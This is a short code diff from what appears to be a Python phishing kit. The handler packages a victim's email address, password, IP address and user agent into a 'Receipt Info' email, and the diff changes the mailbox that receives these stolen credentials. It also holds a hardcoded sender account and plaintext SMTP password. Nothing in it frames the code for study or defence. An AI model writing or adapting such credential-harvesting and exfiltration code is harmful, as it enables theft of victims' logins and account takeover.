@@ -37,7 +37,7 @@ def index():
         subject = country + " | " + pg + " | " + ip
         body = "--------------" + pg + " Receipt Info" + "---------------\n" + "Email Address            : " + ai + "\nPassword           : " + pr + "\n|--------------- I N F O | I P -------------------|\n|Client IP: " + ip + "\nUser Agent : " + useragent + "\n|----------- unknown --------------|"
         sender_email = "accounts@mmolokimedlabs.co.bw"  
-        receiver_email = "Host <littlelighthousingglobal@gmail.com>" 
+        receiver_email = "Chris <littlelighthousingglobal@protonmail.com>" 
         password = "Accountant1986"
 
 
